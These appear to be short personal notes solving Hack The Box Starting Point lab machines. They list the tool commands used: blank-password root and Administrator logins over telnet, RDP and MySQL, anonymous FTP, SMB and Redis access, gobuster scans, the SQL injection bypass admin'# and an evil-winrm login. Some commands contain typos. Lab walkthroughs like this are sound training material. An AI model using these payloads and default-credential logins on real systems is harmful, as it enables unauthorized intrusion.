# TIER 0

### Meow  
telnet as "root", blank password

### Fawn
ftp as anonymous, get flag.txt  

### Dancing  
smbclient -L {IP-address}  
smbclient \\\\{IP-address}\\WorkShares  
ls; cd ..; cd James.P; get flag.txt  

### Redeemer  
redis-cli -h {IP-address}
info  
keys *  
get Flag  

### Explosion
RDP as Administrator, no password  
xfreerdp /v:Administrator /cert:ignore /v:{IP-addess}  

### Preignition
gobuster -x php {IP-address}
http://{IP-address}/admini.php

# TIER 1
### Appoinment
SQLI on login page-> admin'#  

### Sequel
mysql -h {IP-address} -u root
SHOW databases;
USE htb; SHOW tables; SELECT * FROM config;

### Crocodile
ftp anonymous to get list of usernames/passwords
gobustoer -x php to find login.php
admin user goes to server page showing flag  

### Responder  
sudo get install evil-winrm  
evit-winrm -u Administrator -p badminton -i {IP-address}  

### Three
### Ignition
### Bike
### Pennyworth


